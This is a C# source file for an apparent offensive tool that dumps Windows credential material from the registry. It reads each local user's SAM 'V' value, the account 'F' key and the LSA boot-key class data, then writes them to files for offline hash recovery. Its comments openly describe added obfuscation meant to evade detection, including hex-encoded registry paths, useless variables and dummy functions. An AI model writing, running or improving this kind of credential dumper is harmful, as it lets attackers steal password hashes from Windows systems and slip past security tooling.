using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Security.Principal;

/**
 * The purpose of this program is to parse the reigstry of the target machine for those registry keys we know we need to dump user credentials
  * This code is a bit of a mess, but mainly for obfucscation reasons (rudimentary, but its something):
  * Pass useless parameters to functions 
  * Try our best to not store complete paths or hardcoded strings; get what we can from the environment
  * Add useless checks and function calls 
  * Reference uselss namespaces
  * Add functions that are either not referenced or do nothing 
*/

namespace DotNet_Dump
{
    public partial class Program
    {
        // Use PInvoke to call unmanaged Windows libraries from this app
            // NOTE: a lot of this taken from pinvoke.net 
        [DllImport("Advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int RegOpenKeyEx(UIntPtr hKey, string subKey, int ulOptions, int samDesired, out UIntPtr hkResult);

        [DllImport("Advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
        public static extern int RegQueryInfoKey(UIntPtr hKey, StringBuilder lpClass, ref uint lpcchClass, IntPtr lpReserved, out uint lpcSubKeys, out uint lpcbMaxSubKeyLen, out uint lpcbMaxClassLen, out uint lpcValues, out uint lpcbMaxValueNameLen, out uint lpcbMaxValueLen, out uint lpcbSecurityDescriptor, out long lpftLastWriteTime);  

        [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
        public static extern int RegCloseKey(UIntPtr hKey);

        [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError =true)]
        static extern uint GetLastError();

        static void Main(string[] args)
        {
            execute();
        }

        /* Main execution point
         * Input:
         *      N/A
         * Return:
         *      N/A
         * */
        static void execute()
        {
            int status = 0, uselessVar1 = 0x22501984;
            string key, uselessVar2 = "AC1599DEFFBAB3A5CDDD", fKeyValue, bootKeyValue;
            string[] userRids, userValues;

            Debug.WriteLine("Generating key...");

            // Generate our key; continue to use and modify this key so we dont hard code it 
            key = genKey(uselessVar1, uselessVar2);
            if (key != null)
            {
                if (Environment.Is64BitProcess)
                {
                    status = 1 - 1;
                }
                else
                {
                    if (Environment.Is64BitOperatingSystem)
                    {
                        status = uselessVar1 - 0x22501984;
                    }
                }
            }

            Debug.WriteLine("Grabbing user info...");

            // Grab all our user info
            status = grabUserInfo(key, out userRids, out userValues);

            Debug.WriteLine("Grabbing boot key values...");

            // Grab the info we need for our bootkey
            getBootKeyValue(out bootKeyValue);

            Debug.WriteLine("Grabbing our F key value...");

            grabFKey(out fKeyValue);

            Debug.WriteLine("Dumping info...");

            // Dump all our info to an output file
            dumpInfo(bootKeyValue, userRids, userValues, fKeyValue);

            return;
        }

        /* Generate the base key to list our users 
         * Input:
         *      uselessVar1 - useless :)
         *      uselessVar2 - useless :)
         * Return:
         *      The translated stirng key to our users on target
         * */
        static string genKey(in int uselessVar1, in string uselessVar2)
        {
            string key = "";
            string users = "53 41 4D 5C 53 41 4D 5C 44 6F 6D 61 69 6E 73 5C 41 63 63 6F 75 6E 74 5C 55 73 65 72 73";
            string[] userBytes = users.Split(' ');

            // Translate
            foreach (string hex in userBytes)
            {
                int value = Convert.ToInt32(hex, 16);

                string stringValue = Char.ConvertFromUtf32(value);

                key += (char)value;
            }
                              
            RegistryKey openKey = Registry.LocalMachine.OpenSubKey(key);
           
            return key;
        }


        /* Grab our special F key from the registry
         * Input:
         *      fKeyValue - value of the F key
         * Return:
         *      status - success or failure
         * */
        static int grabFKey(out string fKeyValue)
        {
            int status = 1;
            string path = "SAM\\SAM\\Domains\\Account";
            RegistryKey fKey = Registry.LocalMachine;

            byte[] fValue = (byte[])fKey.OpenSubKey(path).GetValue("F");

            StringBuilder bytes = new StringBuilder();
            for (int i = 0; i < fValue.Length; i++)
            {
                bytes.Append(fValue[i].ToString("x2"));
            }

            fKeyValue = bytes.ToString();

            return status;
        }

        /* Grab user RIDs + their V values
         * Input:
         *      key - key string (we dont actually use this)
         *      userRids - array to be filled with all user RIDs on target
         *      userValues - array to be filled with each user's V key
         * Return:
         *      status - success or failure
         * */
        static int grabUserInfo(in string key, out string[] userRids, out string[] userValues)
        {
            int status = 1, numUsers = 0;
            RegistryKey users;
            int index = 0;

            // Open base users key
            users = Registry.LocalMachine.OpenSubKey(key);
            if (users == null)
            {
                Debug.WriteLine("Failed to open users key");
            }

            numUsers = users.SubKeyCount - 1; // dont include 'Names' key

            userRids = new string[numUsers];

            userValues = new string[numUsers];

            Debug.WriteLine("There are " + numUsers.ToString() + " users");

            foreach (string user in users.GetSubKeyNames())
            {
                if (user != "Names")
                {
                    RegistryKey currUser = users.OpenSubKey(user);
                    if (currUser == null)
                    {
                        Debug.WriteLine("Failed to open user sub key" + user);
                    }

                    else
                    {
                        Debug.WriteLine("User RID is " + user);
                    }

                    userRids[index] = user;

                    byte[] vValue = (byte[]) currUser.GetValue("V");    

                    StringBuilder bytes = new StringBuilder();
                    for (int i = 0; i < vValue.Length; i++)
                    {
                        bytes.Append(vValue[i].ToString("x2"));
                    }

                    userValues[index] = bytes.ToString(); 

                    currUser.Close();

                    index++;
                }

                else
                {
                    continue;
                }
            }

            users.Close();

            return status;
        }

        /* Grab the bootkey (really just the JD, Skew1, GBG, and Data keys from LSA; we do the calculation later...)
         * .NET does not expose APIs that allow us to get class information... so we use PInvoke to help us get there
         * Input:
         *      bootKeyValue - JD + Skew1 + GBG + Data keys we need for the bootkey 
         * Return:
         *      N/A
         * */    
        static void getBootKeyValue(out string bootKeyValue)
        {
            RegistryKey bootKeyPath = Registry.LocalMachine;
            string[] keys = {"JD", "Skew1", "GBG", "Data"};
            string path = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
            int result = 0, samDesired = 0xF003F; // KEY_ALL_ACCESS
            UIntPtr hKey = (UIntPtr)0x80000002; // HKLM
            UIntPtr hResult;

            bootKeyValue = "";

            foreach (string key in keys)
            {
                string updatedPath = path + key;
                StringBuilder classInfo = new StringBuilder();
                uint classInfoSize = 255, nullArg2 = 0;
                IntPtr nullArg = IntPtr.Zero;
                long nullArg3 = 0;

                result = RegOpenKeyEx(hKey, updatedPath, 0, samDesired, out hResult);
                if (result != 0)
                {
                    Debug.WriteLine("Failed RegOpenKeyEx! error " + Marshal.GetLastWin32Error().ToString());
                }

                // We only care about class info
                result = RegQueryInfoKey(hResult, classInfo, ref classInfoSize, nullArg, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg2, out nullArg3);
                if (result != 0)
                {
                    Debug.WriteLine("Failed RegQueryInfoKey! error " + Marshal.GetLastWin32Error().ToString());
                }
                else
                {                
                    bootKeyValue += classInfo.ToString();
                }

                result = RegCloseKey(hResult);
                if (result != 0)
                {
                    Debug.WriteLine("Failed RegCloseKey! error " + Marshal.GetLastWin32Error().ToString());
                }

            }

            Debug.WriteLine("Bootkey is " + bootKeyValue);

            return;
        }

        /* Dump all info to appropiate output files
         * Input:
         *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
         *      userRids - array of user RIDs
         *      userValues - array of V key values for each user (1:1 correspondence)
         *      fKeyValue - F key value read from registry
         * Return:
         *      N/A
         * */     
        static void dumpInfo(in string bootKeyValue, in string[] userRids, in string[] userValues, string fKeyValue)
        {
            string dirName = "\\out";
            DirectoryInfo di;
            int index = 0;

            Debug.WriteLine("Creating dir...");

            // Make a dir for all the files
            di = Directory.CreateDirectory(Directory.GetCurrentDirectory() +  dirName);

            // Each filename will be a user RID
            foreach (string userRid in userRids)
            {

                Debug.WriteLine("full path is " +  Directory.GetCurrentDirectory() + dirName + "\\" + userRid + ".txt");

                // Name may be wrong here, probably need full path 
                using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + userRid + ".txt"))
                {
                    outputFile.WriteLine(userValues[index]); // their F key
                    index++;
                }
            }

            Debug.WriteLine("full path for bootkey is " +  Directory.GetCurrentDirectory() + dirName + "\\" + "bootkey" + ".txt");

            // Separate file for the bootkey info 
            using (StreamWriter bootKeyFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + "bootkey" + ".txt"))
            {                
                bootKeyFile.WriteLine(bootKeyValue);                
            }

            // Separate file for our F key
            using (StreamWriter fKeyFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + "fkey" + ".txt"))
            {
                fKeyFile.WriteLine(fKeyValue);
            }

            return;
        }

        // Add random functions that do nothing ?
        static void downloadMovie()
        {
            int cookie = 0x98221;




            return;
        }




    }
}
